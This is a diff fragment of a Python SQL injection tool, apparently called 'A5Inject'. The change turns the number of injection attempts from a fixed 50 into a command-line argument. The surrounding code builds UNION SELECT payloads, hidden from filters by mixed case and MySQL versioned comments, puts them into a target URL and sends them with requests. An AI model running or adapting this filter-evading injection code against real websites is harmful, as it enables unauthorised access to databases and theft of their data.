@@ -10,7 +10,7 @@ target=sys.argv[1]
 usr_a="A5Inject ( SQL Injection Tool )"
 print "[*] Start Inject URL : " + target.replace("[*]", "")
 i="1111111111"
-for x in range(0, 50) :
+for x in range(0, int(sys.argv[2])) :
     query_union="/*!12345UniOn*/SeleCt/**/" + str(i) + "-- '"
     print "[*] Trying Payload : " + target.replace("[*]", query_union)
     get_union=requests.get(url=target.replace("[*]", query_union), headers={ "User-Agent" : usr_a }).content
